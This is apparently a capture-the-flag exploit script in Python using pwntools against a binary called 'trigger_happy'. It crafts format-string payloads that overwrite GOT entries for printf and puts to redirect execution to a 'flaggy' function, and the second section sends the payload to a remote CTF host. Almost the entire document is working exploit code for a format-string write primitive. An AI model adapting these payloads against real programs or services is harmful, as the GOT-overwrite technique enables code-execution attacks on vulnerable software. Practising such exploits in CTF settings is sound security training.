# RazviOverflow
# Python3

from pwn import *

static = ELF("trigger_happy")
vulnerable_address = p32(static.symbols['flaggy'])
got_printf = p32(static.got['printf'])
got_printf_1 = p32(0x0804c00d)

print(vulnerable_address)
print(got_printf)

# 0x0804c00c -> write 0x45 
# 0x0804c00d -> write 0x92


# User input is in the 4th position
payload = b"%65X" + got_printf + b"%5$hhn" 

with open("python_input", "wb") as file:
	file.write(payload)

binary = process("trigger_happy")
binary.sendline(payload)
binary.interactive()


####################### Writeup #################################

from pwn import *

payload =  p32(0x0804c018)         # elf.got['puts']
payload += p32(0x0804c01a)         # elf.got['puts'] + 2
payload += b'%2044x%5$hn'          # writes (0x0804-8)
payload += b'%35393x%4$hn'         # writes (0x9245-0x0804)

#sh = process('./trigger_happy')
sh = remote('ctf.0xl4ugh.com', 1337)
sh.readline()
sh.sendline(payload)
sh.stream()